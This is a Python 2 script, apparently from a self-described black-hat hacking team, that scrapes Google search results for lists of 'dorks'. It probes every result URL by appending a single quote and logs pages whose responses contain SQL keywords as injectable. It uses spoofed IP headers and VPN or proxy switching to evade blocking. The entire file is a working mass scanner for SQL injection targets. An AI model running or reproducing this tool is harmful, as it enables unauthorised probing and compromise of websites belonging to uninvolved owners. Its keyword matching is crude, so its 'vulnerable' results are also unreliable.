#!/usr/bin/python
#Basic SQLi auto dorker and checker
#coded by Alice666x
#Version 1.1.5
import urllib2,urllib,sys,re,random,string,time,threading
print ("""

Priv8 Tools DorkMass_ 
BlackHat Hacker's Community...     | Anonymous indonesia Security T34M
C0d3d: Alice666x@Syndicate666Gh0sT                                                                                           
 _|      _|                                    _|_|_|                        _|                  
 _|_|  _|_|    _|_|_|    _|_|_|    _|_|_|      _|    _|    _|_|    _|  _|_|  _|  _|      _|_|_|  
 _|  _|  _|  _|    _|  _|_|      _|_|          _|    _|  _|    _|  _|_|      _|_|      _|_|      
 _|      _|  _|    _|      _|_|      _|_|      _|    _|  _|    _|  _|        _|  _|        _|_|  
 _|      _|    _|_|_|  _|_|_|    _|_|_|        _|_|_|      _|_|    _|        _|    _|  _|_|_|    

                                                                                                     
   _|_|_|    _|_|      _|        _|            _|                        _|                          
 _|        _|    _|    _|            _|_|_|          _|_|      _|_|_|  _|_|_|_|    _|_|    _|  _|_|  
   _|_|    _|  _|_|    _|        _|  _|    _|  _|  _|_|_|_|  _|          _|      _|    _|  _|_|      
       _|  _|    _|    _|        _|  _|    _|  _|  _|        _|          _|      _|    _|  _|        
 _|_|_|      _|_|  _|  _|_|_|_|  _|  _|    _|  _|    _|_|_|    _|_|_|      _|_|    _|_|    _|        
                                               _|                                                    
                                             _|                                                      
=Priv8 Tools Mass Dorks Auto Exploit.. | Author: Alice666x@Syndicate666Gh0sT=
=SpeciaL Thanks To: INDOS666GH0STSEC T34M | BlackHat Hacker's T34M=
=Blogs: https://indonesiasyndicate666ghost.blogspot.com=
=GitHub: https://github.com/Alice666x=                                                                                                                                                                                          
""")
try:
	dorklist=sys.argv[1]
except:
	print "Usage: "+sys.argv[0]+" [DORK LIST]" #Simple usage for the skids out ther ^_^
	exit(1)
def randomIP():
	return '.'.join('%s'%random.randint(0, 255) for i in range(4)) #Generate random IP for false headers
def test(target,testchar):
	try:
		opener = urllib2.build_opener()
		opener.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')] #Custom user agent.
		opener.addheaders = [('CLIENT-IP',randomIP())] #Inject random IP header into multiple variables, to remain anonymous.
		opener.addheaders = [('REMOTE-ADDR',randomIP())]
		opener.addheaders = [('VIA',randomIP())]
		opener.addheaders = [('X-FORWARDED-FOR',randomIP())]
		keywords=["ABSOLUTE", "ACTION", "ADD", "ALL", "ALLOCATE", "ALTER", "AND", "ANY", "ARE", "AS", "ASC", "ASSERTION", "AT", "AUTHORIZATION", "AVG", "BEGIN", "BETWEEN", "BIT", "BIT_LENGTH", "BOTH", "BY", "CALL", "CASCADE", "CASCADED", "CASE", "CAST", "CATALOG", "CHAR", "CHAR_LENGTH", "CHARACTER", "CHARACTER_LENGTH", "CHECK", "CLOSE", "COALESCE", "COLLATE", "COLLATION", "COLUMN", "COMMIT", "CONDITION", "CONNECT", "CONNECTION", "CONSTRAINT", "CONSTRAINTS", "CONTAINS", "CONTINUE", "CONVERT", "CORRESPONDING", "COUNT", "CREATE", "CROSS", "CURRENT", "CURRENT_DATE", "CURRENT_PATH", "CURRENT_TIME", "CURRENT_TIMESTAMP", "CURRENT_USER", "CURSOR", "DATE", "DAY", "DEALLOCATE", "DEC", "DECIMAL", "DECLARE", "DEFAULT", "DEFERRABLE", "DEFERRED", "DELETE", "DESC", "DESCRIBE", "DESCRIPTOR", "DETERMINISTIC", "DIAGNOSTICS", "DISCONNECT", "DISTINCT", "DO", "DOMAIN", "DOUBLE", "DROP", "ELSE", "ELSEIF", "END", "ESCAPE", "EXCEPT", "EXCEPTION", "EXEC", "EXECUTE", "EXISTS", "EXIT", "EXTERNAL", "EXTRACT", "FALSE", "FETCH", "FIRST", "FLOAT", "FOR", "FOREIGN", "FOUND", "FROM", "FULL", "FUNCTION", "GET", "GLOBAL", "GO", "GOTO", "GRANT", "GROUP", "HANDLER", "HAVING", "HOUR", "IDENTITY", "IF", "IMMEDIATE", "IN", "INDICATOR", "INITIALLY", "INNER", "INOUT", "INPUT", "INSENSITIVE", "INSERT", "INT", "INTEGER", "INTERSECT", "INTERVAL", "INTO", "IS", "ISOLATION", "JOIN", "KEY", "LANGUAGE", "LAST", "LEADING", "LEAVE", "LEFT", "LEVEL", "LIKE", "LOCAL", "LOOP", "LOWER", "MATCH", "MAX", "MIN", "MINUTE", "MODULE", "MONTH", "NAMES", "NATIONAL", "NATURAL", "NCHAR", "NEXT", "NO", "NOT", "NULL", "NULLIF", "NUMERIC", "OCTET_LENGTH", "OF", "ON", "ONLY", "OPEN", "OPTION", "OR", "ORDER", "OUT", "OUTER", "OUTPUT", "OVERLAPS", "PAD", "PARAMETER", "PARTIAL", "PATH", "POSITION", "PRECISION", "PREPARE", "PRESERVE", "PRIMARY", "PRIOR", "PRIVILEGES", "PROCEDURE", "READ", "REAL", "REFERENCES", "RELATIVE", "REPEAT", "RESIGNAL", "RESTRICT", "RETURN", "RETURNS", "REVOKE", "RIGHT", "ROLLBACK", "ROUTINE", "ROWS", "SCHEMA", "SCROLL", "SECOND", "SECTION", "SELECT", "SESSION", "SESSION_USER", "SET", "SIGNAL", "SIZE", "SMALLINT", "SOME", "SPACE", "SPECIFIC", "SQL", "SQLCODE", "SQLERROR", "SQLEXCEPTION", "SQLSTATE", "SQLWARNING", "SUBSTRING", "SUM", "SYSTEM_USER", "TABLE", "TEMPORARY", "THEN", "TIME", "TIMESTAMP", "TIMEZONE_HOUR", "TIMEZONE_MINUTE", "TO", "TRAILING", "TRANSACTION", "TRANSLATE", "TRANSLATION", "TRIM", "TRUE", "UNDO", "UNION", "UNIQUE", "UNKNOWN", "UNTIL", "UPDATE", "UPPER", "USAGE", "USER", "USING", "VALUE", "VALUES", "VARCHAR", "VARYING", "VIEW", "WHEN", "WHENEVER", "WHERE", "WHILE", "WITH", "WORK", "WRITE", "YEAR", "ZONE", "", "# MySQL 5.0 keywords (reference: http://dev.mysql.com/doc/refman/5.0/en/reserved-words.html)", "ADD", "ALL", "ALTER", "ANALYZE", "AND", "ASASC", "ASENSITIVE", "BEFORE", "BETWEEN", "BIGINT", "BINARYBLOB", "BOTH", "BY", "CALL", "CASCADE", "CASECHANGE", "CAST", "CHAR", "CHARACTER", "CHECK", "COLLATE", "COLUMN", "CONCAT", "CONDITIONCONSTRAINT", "CONTINUE", "CONVERT", "CREATE", "CROSS", "CURRENT_DATE", "CURRENT_TIMECURRENT_TIMESTAMP", "CURRENT_USER", "CURSOR", "DATABASE", "DATABASES", "DAY_HOUR", "DAY_MICROSECONDDAY_MINUTE", "DAY_SECOND", "DEC", "DECIMAL", "DECLARE", "DEFAULTDELAYED", "DELETE", "DESC", "DESCRIBE", "DETERMINISTIC", "DISTINCTDISTINCTROW", "DIV", "DOUBLE", "DROP", "DUAL", "EACH", "ELSEELSEIF", "ENCLOSED", "ESCAPED", "EXISTS", "EXIT", "EXPLAIN", "FALSEFETCH", "FLOAT", "FLOAT4", "FLOAT8", "FOR", "FORCE", "FOREIGNFROM", "FULLTEXT", "GRANT", "GROUP", "HAVING", "HIGH_PRIORITYHOUR_MICROSECOND", "HOUR_MINUTE", "HOUR_SECOND", "IF", "IFNULL", "IGNORE", "ININDEX", "INFILE", "INNER", "INOUT", "INSENSITIVE", "INSERT", "INTINT1", "INT2", "INT3", "INT4", "INT8", "INTEGER", "INTERVALINTO", "IS", "ISNULL", "ITERATE", "JOIN", "KEY", "KEYS", "KILLLEADING", "LEAVE", "LEFT", "LIKE", "LIMIT", "LINESLOAD", "LOCALTIME", "LOCALTIMESTAMP", "LOCK", "LONG", "LONGBLOBLONGTEXT", "LOOP", "LOW_PRIORITY", "MATCH", "MEDIUMBLOB", "MEDIUMINT", "MEDIUMTEXTMIDDLEINT", "MINUTE_MICROSECOND", "MINUTE_SECOND", "MOD", "MODIFIES", "NATURAL", "NOTNO_WRITE_TO_BINLOG", "NULL", "NUMERIC", "ON", "OPTIMIZE", "OPTION", "OPTIONALLYOR", "ORDER", "OUT", "OUTER", "OUTFILE", "PRECISIONPRIMARY", "PROCEDURE", "PURGE", "READ", "READS", "REALREFERENCES", "REGEXP", "RELEASE", "RENAME", "REPEAT", "REPLACE", "REQUIRERESTRICT", "RETURN", "REVOKE", "RIGHT", "RLIKE", "SCHEMA", "SCHEMASSECOND_MICROSECOND", "SELECT", "SENSITIVE", "SEPARATOR", "SET", "SHOW", "SMALLINTSONAME", "SPATIAL", "SPECIFIC", "SQL", "SQLEXCEPTION", "SQLSTATESQLWARNING", "SQL_BIG_RESULT", "SQL_CALC_FOUND_ROWS", "SQL_SMALL_RESULT", "SSL", "STARTINGSTRAIGHT_JOIN", "TABLE", "TERMINATED", "THEN", "TINYBLOB", "TINYINT", "TINYTEXTTO", "TRAILING", "TRIGGER", "TRUE", "UNDO", "UNION", "UNIQUEUNLOCK", "UNSIGNED", "UPDATE", "USAGE", "USE", "USING", "UTC_DATEUTC_TIME", "UTC_TIMESTAMP", "VALUES", "VARBINARY", "VARCHAR", "VARCHARACTERVARYING", "VERSION", "WHEN", "WHERE", "WHILE", "WITH", "WRITEXOR", "YEAR_MONTH", "ZEROFILL"]
		print "[+] Trying "+target+testchar
		try:
			resp=opener.open(target+testchar,timeout=5)
		except Exception, e:
			print "[-] "+str(e)
			return
		for keyword in keywords:
			try:
				for x in resp.read().split(" "):
					if keyword in x:
						print "[+] Found keyword '"+keyword+"' at "+target+testchar
						f=open("SQLi_Vulnerable.txt","a")
						f.write(target+testchar+"\r\n")
						f.close()
						break
			except urllib2.HTTPError as e:
				print "[-] "+str(e)
				pass
	except urllib2.URLError as e:
		print "[-] "+str(e)
		pass
def spyder(dork,page):
	opener = urllib2.build_opener()
	opener.addheaders = [('User-agent','Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11')] #Custom user agent.
	opener.addheaders = [('CLIENT-IP',randomIP())] #Inject random IP header into multiple variables, to remain anonymous.
	opener.addheaders = [('REMOTE-ADDR',randomIP())]
	opener.addheaders = [('VIA',randomIP())]
	opener.addheaders = [('X-FORWARDED-FOR',randomIP())]
	opener.addheaders = [('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
	opener.addheaders = [('Accept-Language','en-US,en;q=0.5')]
	opener.addheaders = [('Accept-Encoding','gzip, deflate')]
	opener.addheaders = [('Referer',dork)]
	try:
		searchresults=opener.open(dork,timeout=5).read()
	except Exception, e:
		print "[-] "+str(e)
		print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
		raw_input()
		spyder(dork, page)
	try:
		searchresults
	except NameError:
#		print "[-] Variable undefined, re-searching"
		try:
			searchresults=opener.open(dork,timeout=5).read()
		except:
			try:
				searchresults=opener.open(dork,timeout=5).read()
			except:
				print "[-] Bot has been blocked from google!!! Change VPN server or proxy! Press enter to continue"
				raw_input()
				spyder(dork, page)
	else:
		pass
#		print "[+] Variable defined, continuing search"

	for i in re.findall('''href=["'](.[^"']+)["']''',searchresults, re.I):
		i=i.replace("amp;",'')
		if i.endswith("start="+str(page)+"0&sa=N") and i.startswith("/search"):
			dorkurl="https://encrypted.google.com"+i
			print "[+] Searching next page "+dorkurl
			spyder(dorkurl,page)
			page+=1
		i=urllib2.unquote(i).decode('utf8')
		try:
			i=i.split("?q=")[1]
			i=i.split("&sa=")[0]
			if i.startswith("http"):
					if i.startswith("http://accounts.google.com"):
						continue
					elif i.startswith("http://www.google.com"):
						continue
					elif i.startswith("http://encrypted.google.com"):
						continue
					elif i.startswith("http://webcache.googleusercontent.com"):
						continue
					elif i!=dork.decode('utf8'):
						threading.Thread(target=test, args=(i,"'",)).start()
		except:
			continue
f=open(dorklist,"r")
for dork in f.read().split("\n"):
	print "[+] Searching for dork: '"+dork+"'"
	spyder('https://encrypted.google.com/search?hl=en&q='+urllib.quote_plus(dork),1)
f.close()